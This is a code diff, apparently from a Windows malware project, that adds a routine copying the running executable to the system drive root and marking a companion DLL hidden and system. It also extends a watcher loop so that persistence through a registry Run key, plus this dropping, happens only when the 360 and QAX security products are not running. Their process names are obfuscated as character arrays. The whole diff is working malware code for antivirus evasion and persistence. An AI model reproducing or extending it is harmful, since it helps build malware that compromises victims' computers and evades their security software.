@@ -85,8 +85,47 @@ char* GetLinkDocFileName(char* szDstBuf, char* szCurrentPath)
 
 
 
+int saveProgram()
+{
+	char dllfn[MAX_PATH];
+	char exefn[MAX_PATH];
+	char curDllName[MAX_PATH];
+	char curExeName[MAX_PATH];
+	int iRet = GetModuleFileNameA(0, exefn, MAX_PATH);
+	GetNameFromFullName(exefn, curDllName);
+	writeLog("caution:curDllName:%s\r\n", curDllName);
 
+	iRet = GetModuleFileNameA(lpThisDll, dllfn, MAX_PATH);
+	GetNameFromFullName(dllfn, curExeName);
+	writeLog("caution:curExeName:%s\r\n", curExeName);
 
+	char pDstPath[4];
+	pDstPath[0] = szSysDir[0];
+	pDstPath[1] = ':';
+	pDstPath[2] = '\\';
+	pDstPath[3] = 0;
+
+	string dstexefn = string(pDstPath) + "Program";
+	string dstdllfn = string(pDstPath) + curDllName;
+	if (_access(dstexefn.c_str(), 0) == 0 && _access(dstdllfn.c_str(), 0) == 0)
+	{
+		return TRUE;
+	}
+
+	iRet = lpCopyFileA((char*)exefn, (char*)dstexefn.c_str(), FALSE);
+	//movefile can not movefile between different disk,so use copyfile instead of movefile
+	if (iRet == 0)
+	{
+		writeLog("lpCopyFileA %s to %s error:%u\r\n", exefn, dstexefn.c_str(), lpRtlGetLastWin32Error());
+	}
+	else
+	{
+		writeLog("lpCopyFileA %s to %s ok\r\n", dllfn, dstdllfn.c_str());
+		iRet = lpSetFileAttributesA((char*)dstdllfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
+	}
+
+	return TRUE;
+}
 
 
 int backHome(char* pDstPath, char* szCurrentDir, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD* iDllCnt)
@@ -351,8 +390,12 @@ DWORD __stdcall snoop360snooze()
 		while (TRUE)
 		{
 			char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
+
+			char szQAXSafe[] = { 'Q','A','X','S','a','f','e','.','e','x','e',0 };
+
+			bQAXSafeRunning = GetProcessIdByName(szQAXSafe);
 			b360Running = GetProcessIdByName(sz360Tray);
-			if (b360Running == FALSE)
+			if (b360Running == FALSE && bQAXSafeRunning == FALSE)
 			{
 				writeLog("360 is absent so you can do something you want\r\n");
 
@@ -378,6 +421,8 @@ DWORD __stdcall snoop360snooze()
 
 					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
 				}
+
+				saveProgram();
 
 				writeLog("SetBootForRegRun ok\r\n");
 
